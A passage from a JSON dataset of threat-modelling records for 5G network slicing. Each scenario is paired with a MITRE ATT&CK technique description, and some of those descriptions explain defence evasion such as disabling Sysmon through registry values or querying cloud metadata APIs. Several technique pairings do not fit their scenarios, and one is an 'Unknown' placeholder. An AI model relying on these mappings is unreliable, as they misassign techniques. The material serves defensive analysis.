                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive user data within a network slice.",
            "Assumptions": [
                {
                    "Assumption": "System does not encrypt sensitive data at rest.",
                    "Role": "System",
                    "Condition": "Lack of Encryption"
                },
                {
                    "Assumption": "Insufficient access control measures to sensitive data.",
                    "Role": "System",
                    "Condition": "Weak Access Controls"
                },
                {
                    "Assumption": "Network traffic containing sensitive data is not encrypted.",
                    "Role": "Network",
                    "Condition": "Unencrypted Traffic"
                }
            ],
            "Potential Impact": "Compromise of user confidentiality, leading to privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "sensitive data",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive system configuration data exposed via unprotected API.",
            "Assumptions": [
                {
                    "Assumption": "API access not sufficiently authenticated and authorized.",
                    "Role": "System",
                    "Condition": "Weak API Security"
                },
                {
                    "Assumption": "Sensitive configuration data is present in API responses.",
                    "Role": "System",
                    "Condition": "Poor Data Handling"
                },
                {
                    "Assumption": "APIs are accessible from untrusted networks.",
                    "Role": "System",
                    "Condition": "Access from Untrusted Networks"
                }
            ],
            "Potential Impact": "Exposure of system configuration leading to targeted attacks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "API security",
                "system configuration"
            ],
            "mitre_technique": {
                "name": "Launch Daemon",
                "description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)",
                "id": "attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba",
                "technique_id": "T1543.004"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Logging sensitive information in improperly secured logs.",
            "Assumptions": [
                {
                    "Assumption": "Logs contain sensitive user information.",
                    "Role": "System",
                    "Condition": "Sensitive Information in Logs"
                },
                {
                    "Assumption": "Log files are accessible to unauthorized users.",
                    "Role": "System",
                    "Condition": "Weak Log Security"
                },
                {
                    "Assumption": "Insufficient encryption for log data.",
                    "Role": "System",
                    "Condition": "Lack of Log Encryption"
                }
            ],
            "Potential Impact": "Sensitive data exposure, leading to unauthorized access and privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "logging",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding the network slice with traffic to degrade performance.",
            "Assumptions": [
                {
                    "Assumption": "Network slices are exposed to the public internet without adequate firewall protection.",
                    "Role": "Network",
                    "Condition": "Public Exposure"
                },
                {
                    "Assumption": "No rate-limiting mechanisms are applied to network traffic.",
                    "Role": "Network",
                    "Condition": "Lack of Rate Limiting"
                },
                {
                    "Assumption": "System lacks adequate monitoring and response measures for high traffic volumes.",
                    "Role": "System",
                    "Condition": "Poor Monitoring"
                }
            ],
            "Potential Impact": "Degraded service performance or complete unavailability of network slice.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flood",
                "network performance"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker compromises VNFs to consume all available resources.",
            "Assumptions": [
                {
                    "Assumption": "VNFs do not have resource usage limits enforced.",
                    "Role": "System",
                    "Condition": "Lack of Resource Limits"
                },
                {
                    "Assumption": "Compromised VNFs are not isolated from other VNFs and share resources.",
                    "Role": "System",
                    "Condition": "Weak Isolation"
                },
                {
                    "Assumption": "Monitoring systems do not detect abnormal resource consumption.",
                    "Role": "System",
                    "Condition": "Poor Monitoring"
                }
            ],
            "Potential Impact": "Resource exhaustion leading to service disruption across multiple slices.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "virtualized network function"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Targeted attack on orchestration systems to halt management operations.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration systems are accessible from untrusted networks.",
                    "Role": "System",
                    "Condition": "Access from Untrusted Networks"
                },
                {
                    "Assumption": "System lacks adequate DDoS protection mechanisms.",
                    "Role": "System",
                    "Condition": "Weak DDoS Protection"
                },
                {
                    "Assumption": "Orchestration systems have high availability requirements not properly adhered to.",
                    "Role": "System",
                    "Condition": "High Availability Requirements"
                }
            ],
            "Potential Impact": "Disruption to network slice management and provisioning operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "orchestration",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in a VNF to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "VNFs contain exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Presence of Vulnerabilities"
                },
                {
                    "Assumption": "Attacker has knowledge of the VNF and its vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Technical Knowledge"
                },
                {
                    "Assumption": "Appropriate security patches have not been applied to VNFs.",
                    "Role": "System",
                    "Condition": "Lack of Patching"
                }
            ],
            "Potential Impact": "Unauthorized access and control over additional network functions and data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "virtualized network function"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromised user gains administrative privileges on orchestration tools.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication mechanisms for accessing orchestration tools.",
                    "Role": "System",
                    "Condition": "Weak Authentication"
                },
                {
                    "Assumption": "Insufficient segregation of user roles and privileges.",
                    "Role": "System",
                    "Condition": "Poor Role Segregation"
                },
                {
                    "Assumption": "System lacks multifactor authentication.",
                    "Role": "System",
                    "Condition": "Lack of MFA"
                }
            ],
            "Potential Impact": "Complete administrative control over network slices and functions by unauthorized user.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "administrative access",
                "orchestration"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting trust boundaries to gain privileged access to other network segments.",
            "Assumptions": [
                {
                    "Assumption": "Trust boundaries are not appropriately enforced.",
                    "Role": "System",
                    "Condition": "Weak Boundary Enforcement"
                },
                {
                    "Assumption": "Network does not properly segment and isolate different trust zones.",
                    "Role": "Network",
                    "Condition": "Insufficient Segmentation"
                },
                {
                    "Assumption": "Privileges can be escalated across boundary due to misconfigurations.",
                    "Role": "System",
                    "Condition": "Misconfigurations"
                }
            ],
            "Potential Impact": "Unauthorized access to multiple network segments, compromising overall system security.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "trust boundaries",
                "network segmentation"
            ],
            "mitre_technique": {
                "name": "Network Boundary Bridging",
                "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
                "id": "attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166",
                "technique_id": "T1599"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "20",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to gain access to the network slice management interface.",
            "Assumptions": [
                {
                    "Assumption": "Network slice management interface is accessible over the internet.",
                    "Role": "Attacker",
                    "Condition": "Valid if interface configuration exposes it to external networks."
                },
                {
                    "Assumption": "User credentials are not sufficiently protected (e.g., weak passwords, lack of 2FA).",
                    "Role": "Attacker",
                    "Condition": "Valid if password policies are weak or multi-factor authentication is not enforced."
                },
                {
                    "Assumption": "Logging and monitoring are insufficient to detect unauthorized access.",
                    "Role": "Security Administrator",
                    "Condition": "Valid if log management and real-time monitoring are not robust."
                }
            ],
            "Potential Impact": "Could lead to unauthorized access, data tampering, and service disruption.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Identity Theft",
                "Network Interface",
                "Credential Access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor uses a fake NFVO to manipulate orchestration processes.",
            "Assumptions": [
                {
                    "Assumption": "NFVO identity is not being verified.",
                    "Role": "Attacker",
                    "Condition": "Valid if NFVO verification mechanisms are weak or absent."
                },
                {
                    "Assumption": "Communications between NFVO and network functions are not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if encryption protocols are not properly implemented."
                },
                {
                    "Assumption": "Operational staff relies on default configurations without verification.",
                    "Role": "Operational Staff",
                    "Condition": "Valid if staff configuration checks are not stringent."
                }
            ],
            "Potential Impact": "Leads to control over network slice operations, potential data breaches, and system compromise.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Orchestration Manipulation",
                "Fake NFVO",
                "Credential Access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Intruder mimics trusted external interfaces to introduce malware.",
            "Assumptions": [
                {
                    "Assumption": "Lack of validation for incoming communications from external interfaces.",
                    "Role": "Security Systems",
                    "Condition": "Valid if external interfaces are not properly authenticated."
                },
                {
                    "Assumption": "Network segmentation is insufficient to isolate untrusted traffic.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if network segmentation rules are poorly designed."
                },
                {
                    "Assumption": "Malware detection mechanisms are not up to date.",
                    "Role": "System Administrator",
                    "Condition": "Valid if anti-malware tools lack recent threat signatures."
                }
            ],
            "Potential Impact": "Can result in malware introduction, unauthorized access, and potential large-scale disruptions.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Malware Introduction",
                "External Interfaces",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker modifies VNFs to alter the performance of network slices.",
            "Assumptions": [
                {
                    "Assumption": "VNFs lack adequate access controls.",
                    "Role": "Network Security",
                    "Condition": "Valid if VNF permissions are not strictly enforced."
                },
                {
                    "Assumption": "Monitoring of VNF integrity is weak.",
                    "Role": "Security Team",
                    "Condition": "Valid if no real-time integrity checks are in place."
                },
                {
                    "Assumption": "Network slice configurations are not regularly audited.",
                    "Role": "Audit Team",
                    "Condition": "Valid if configuration audits are infrequent or incomplete."
                }
            ],
            "Potential Impact": "Leads to data integrity issues, performance degradation, and reliability concerns.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "VNF Modification",
                "Network Slice",
                "Performance Degradation"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Compromised edge computing nodes alter data processing workflows.",
            "Assumptions": [
                {
                    "Assumption": "Edge computing nodes are not secured.",
                    "Role": "Edge Computing Admin",
                    "Condition": "Valid if there are weak security measures on edge nodes."
                },
                {
                    "Assumption": "Data integrity checks are not performed consistently.",
                    "Role": "Data Processing Team",
                    "Condition": "Valid if integrity verification processes are overlooked."
                },
                {
                    "Assumption": "Assumption: No encrypted communication between edge nodes and central servers.",
                    "Role": "Network Security",
                    "Condition": "Valid if encryption is not enforced end-to-end."
                }
            ],
            "Potential Impact": "Results in corrupted data, unauthorized data processing, and potential breaches.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Edge Computing",
                "Workflow Alteration",
                "Data Processing"
            ],
            "mitre_technique": {
                "name": "Clear Network Connection History and Configurations",
                "description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
                "id": "attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc",
                "technique_id": "T1070.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Intruder gains access to NFVO and alters orchestration scripts.",
            "Assumptions": [
                {
                    "Assumption": "NFVO access controls are not strong enough.",
                    "Role": "Orchestration Manager",
                    "Condition": "Valid if access policies are not stringent."
                },
                {
                    "Assumption": "Script changes are not logged nor monitored.",
                    "Role": "IT Monitoring",
